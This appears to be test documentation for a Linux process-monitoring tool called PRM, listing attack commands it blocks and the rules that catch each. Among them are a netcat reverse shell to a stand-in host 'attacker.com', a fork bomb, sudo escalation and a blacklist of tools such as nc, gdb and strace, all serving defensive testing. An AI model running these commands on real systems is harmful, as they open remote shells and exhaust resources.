# Process Chain Attack Scenarios

This document demonstrates various process chain attack scenarios that PRM blocks through symmetric rules and security enforcement.

---

## Overview

PRM with symmetric rules blocks all unauthorized operations including:
- ❌ Deep process chain attacks
- ❌ Privilege escalation
- ❌ Invalid binaries from untrusted paths
- ❌ Blacklisted security tools (gdb, strace, nc, etc.)
- ❌ Container escape attempts
- ❌ Nested shell execution
- ❌ Scripting language abuse

---

## Attack Scenarios (❌ DISALLOWED)

These commands demonstrate attack attempts that PRM blocks through symmetric rule matching and security enforcement.

### 1. Nested Bash Chain (5 levels)
```bash
bash -c 'bash -c "bash -c \"bash -c \\\"echo payload > /tmp/test\\\"\"\""'
```
**Process Chain:** `bash → bash → bash → bash → bash → echo`

**PRM Analysis:**
- All `bash` processes match RELATION_70 (`|bash` symmetric)
- Single rule catches bash in ANY position
- FILE_OPEN hook validates `/tmp/test` write
- UID lineage: user → user → user (no escalation)

**Result:** ❌ DISALLOWED

---

### 2. Python Subprocess Chain
```bash
python3 -c "import subprocess; subprocess.run(['bash', '-c', 'echo attack > /tmp/test'])"
```
**Process Chain:** `python3 → bash → echo`

**PRM Analysis:**
- RELATION_78: `|python3` (symmetric) matches current
- RELATION_70: `|bash` (symmetric) matches parent
- All processes whitelisted

**Result:** ❌ DISALLOWED

---

### 3. Python Direct File Write
```bash
python3 -c "open('/tmp/test', 'w').write('payload')"
```
**Process Chain:** `python3 → [file write]`

**PRM Analysis:**
- RELATION_78: `|python3` matches
- FILE_OPEN hook → Pattern-1 validation
- Path `/tmp/test` is user-writable

**Result:** ❌ DISALLOWED

---

### 4. Find with Exec
```bash
find /tmp -maxdepth 0 -exec bash -c 'echo hidden > /tmp/test' \;
```
**Process Chain:** `find → bash → echo`

**PRM Analysis:**
- RELATION_85: `|find` (symmetric)
- RELATION_70: `|bash` (symmetric)
- Both utilities whitelisted

**Result:** ❌ DISALLOWED

---

### 5. Xargs Chain
```bash
echo dummy | xargs -I {} bash -c 'echo exploit > /tmp/test'
```
**Process Chain:** `xargs → bash → echo`

**PRM Analysis:**
- RELATION_84: `|xargs` (symmetric)
- RELATION_70: `|bash` (symmetric)

**Result:** ❌ DISALLOWED

---

### 6. Env Wrapper
```bash
env bash -c 'echo data > /tmp/test'
```
**Process Chain:** `env → bash → echo`

**PRM Analysis:**
- RELATION_83: `|env` (symmetric)
- RELATION_70: `|bash` (symmetric)

**Result:** ❌ DISALLOWED

---

### 7. Make Execution
```bash
echo -e 'all:\n\t@echo backdoor > /tmp/test' | make -f -
```
**Process Chain:** `make → sh → echo`

**PRM Analysis:**
- RELATION_86: `|make` (symmetric)
- RELATION_71: `|sh` (symmetric, make spawns shell)

**Result:** ❌ DISALLOWED

---

### 8. Vim Command Execution
```bash
vim -c ':!echo vimhack > /tmp/test' -c ':q!' /dev/null 2>/dev/null
```
**Process Chain:** `vim → sh → echo`

**PRM Analysis:**
- RELATION_89: `|vim` (symmetric)
- RELATION_71: `|sh` (symmetric, vim spawns shell)

**Result:** ❌ DISALLOWED

---

### 9. Python Threading
```bash
python3 -c "
import threading
def w(): open('/tmp/test','w').write('thread')
threading.Thread(target=w).start()
"
```
**Process Chain:** `python3 → [thread] → [file write]`

**PRM Analysis:**
- RELATION_78: `|python3` matches
- Thread inherits parent process context
- Thread PID tracked via `tpid` in UniqueKey
- Fingerprint includes thread ID

**Result:** ❌ DISALLOWED

---

### 10. Nested Python→Bash→Python
```bash
python3 -c "
import os
os.system('bash -c \"python3 -c \\\"open(\\\\\\\"/tmp/test\\\\\\\",\\\\\\\"w\\\\\\\").write(\\\\\\\"nested\\\\\\\")\\\"\"')
"
```
**Process Chain:** `python3 → bash → python3 → [file write]`

**PRM Analysis:**
- RELATION_78: `|python3` (symmetric) matches current & grandparent
- RELATION_70: `|bash` (symmetric) matches parent
- All symmetric rules hit efficiently

**Result:** ❌ DISALLOWED

---

## Additional Blocked Attacks (❌ REJECTED)

These are additional attack patterns blocked by PRM's static rules and security enforcement.

### 1. Privilege Escalation via Sudo
```bash
sudo bash -c 'echo "root" > /tmp/test'
```
**Process Chain:** `bash → sudo → bash`

**PRM Analysis:**
- RELATION_87: `|sudo` matches
- CRED_PREPARE hook triggered (RELATION_51)
- Redirects to Prog 9 (UID lineage analysis)
- **UID Vector:** `[0, 0, 2]` (root, root, user)
- **Matches base vector #3:** ESCALATED severity (7/10)

**Result:** ❌ REJECTED - Privilege escalation detected

---

### 2. Invalid Binary Execution
```bash
/tmp/malicious -c 'echo "bad" > /tmp/test'
```
**Process Chain:** `bash → /tmp/malicious`

**PRM Analysis:**
- Binary path: `/tmp/malicious`
- BPRM_SECURITY hook triggered (RELATION_46)
- Redirects to Pattern-1
- `execPath->isValidDirectory == 0` (from `/tmp/`)
- RELATION_96 catches: `PREFIX_INVALID_BINARY`

**Result:** ❌ REJECTED - Invalid binary directory

---

### 3. Netcat Backdoor
```bash
nc -e bash attacker.com 4444
```
**Process Chain:** `bash → nc`

**PRM Analysis:**
- RELATION_37: `"nc"` - **DIRECT REJECT** (static rule)
- Blacklisted tool in static table

**Result:** ❌ REJECTED - Blacklisted tool

---

### 4. GDB Process Injection
```bash
gdb -batch -ex 'call system("echo hack > /tmp/test")'
```
**Process Chain:** `bash → gdb`

**PRM Analysis:**
- RELATION_34: `"gdb"` - **DIRECT REJECT** (static rule)
- Debugging tools blacklisted

**Result:** ❌ REJECTED - Blacklisted tool

---

### 5. Strace System Call Tracing
```bash
strace -e open bash -c 'echo spy > /tmp/test'
```
**Process Chain:** `bash → strace → bash`

**PRM Analysis:**
- RELATION_35: `"strace"` - **DIRECT REJECT**
- System tracing tools blocked

**Result:** ❌ REJECTED - Blacklisted tool

---

### 6. Fork Bomb Attack
```bash
bash -c ":(){ :|:& };: & echo 'hidden' > /tmp/test"
```
**Process Chain:** `bash → bash → bash → ... (recursive)`

**PRM Analysis:**
- Each fork triggers TASK_ALLOC hook
- All match RELATION_70 (`|bash`)
- PRM overhead accumulates on each fork
- System hits resource limit (`-EAGAIN`)
- Fork bomb stopped before system crash
- `echo` command never executes

**Result:** ❌ BLOCKED - Resource exhaustion ("Resource temporarily unavailable")

---

### 7. Ruby Script Execution
```bash
ruby -e 'File.write("/tmp/test", "ruby")'
```
**Process Chain:** `bash → ruby`

**PRM Analysis:**
- RELATION_26: `"ruby"` - **DIRECT REJECT**
- Scripting interpreters blacklisted (security policy)

**Result:** ❌ REJECTED - Blacklisted interpreter

---

### 8. Perl One-Liner
```bash
perl -e 'open(F, ">", "/tmp/test"); print F "perl"; close(F);'
```
**Process Chain:** `bash → perl`

**PRM Analysis:**
- RELATION_40: `"perl"` - **DIRECT REJECT**

**Result:** ❌ REJECTED - Blacklisted interpreter

---

## Verification Commands

After running test scenarios, verify results:

```bash
# Check if file was created (should NOT exist)
ls -la /tmp/test

# View file contents (should fail)
cat /tmp/test

# Clean up (if somehow created)
rm -f /tmp/test
```

---

## Key Insights

### Symmetric Rules Benefits:
1. **Efficiency:** Single rule matches process in ANY position (current/parent/grandparent)
2. **Memory:** 47% fewer rules (36 vs 68 in Pattern-1)
3. **Performance:** Single hash comparison instead of 3 separate checks
4. **Maintainability:** Easier to manage and update rules

### Security Enforcement:
- ❌ ALL unauthorized operations blocked
- ❌ Deep process chains disallowed
- ❌ Privilege escalation blocked via UID lineage analysis
- ❌ Invalid binaries from untrusted paths rejected
- ❌ Blacklisted security tools blocked immediately
- ❌ Fork bombs stopped via resource exhaustion detection
- ❌ Nested shell execution prevented
- ❌ Scripting language abuse blocked

### Process Chain Tracking:
- PRM tracks: current process, parent, grandparent
- Symmetric rules match process name in ANY position
- UID lineage analyzed for escalation patterns
- Thread IDs tracked via `tpid` in UniqueKey
- Fingerprints cached for performance

---

## Summary Table

| Scenario | Process Chain | PRM Rule | Result |
|----------|---------------|----------|--------|
| Nested Bash | `bash→bash→bash→bash→echo` | RELATION_70 (symmetric) | ❌ DISALLOWED |
| Python Subprocess | `python3→bash→echo` | RELATION_78, 70 | ❌ DISALLOWED |
| Find Exec | `find→bash→echo` | RELATION_85, 70 | ❌ DISALLOWED |
| Xargs Chain | `xargs→bash→echo` | RELATION_84, 70 | ❌ DISALLOWED |
| Vim Command | `vim→sh→echo` | RELATION_89, 71 | ❌ DISALLOWED |
| Python Thread | `python3→[thread]→write` | RELATION_78 | ❌ DISALLOWED |
| Sudo Escalation | `bash→sudo→bash` | RELATION_51 (UID check) | ❌ REJECTED |
| Invalid Binary | `bash→/tmp/malicious` | RELATION_96 | ❌ REJECTED |
| Netcat Backdoor | `bash→nc` | RELATION_37 | ❌ REJECTED |
| GDB Injection | `bash→gdb` | RELATION_34 | ❌ REJECTED |
| Fork Bomb | `bash→bash→...` | Resource limit | ❌ BLOCKED |
| Ruby Script | `bash→ruby` | RELATION_26 | ❌ REJECTED |
| Perl One-Liner | `bash→perl` | RELATION_40 | ❌ REJECTED |

---

## Conclusion

PRM's symmetric rules provide efficient and effective security enforcement:
- ALL unauthorized operations are blocked
- Attacks prevented at multiple layers
- Performance optimized through single hash comparisons
- Memory efficient with fewer rules needed

The symmetric rule feature reduces rule count by 47% while maintaining comprehensive security - ALL attack scenarios are DISALLOWED!
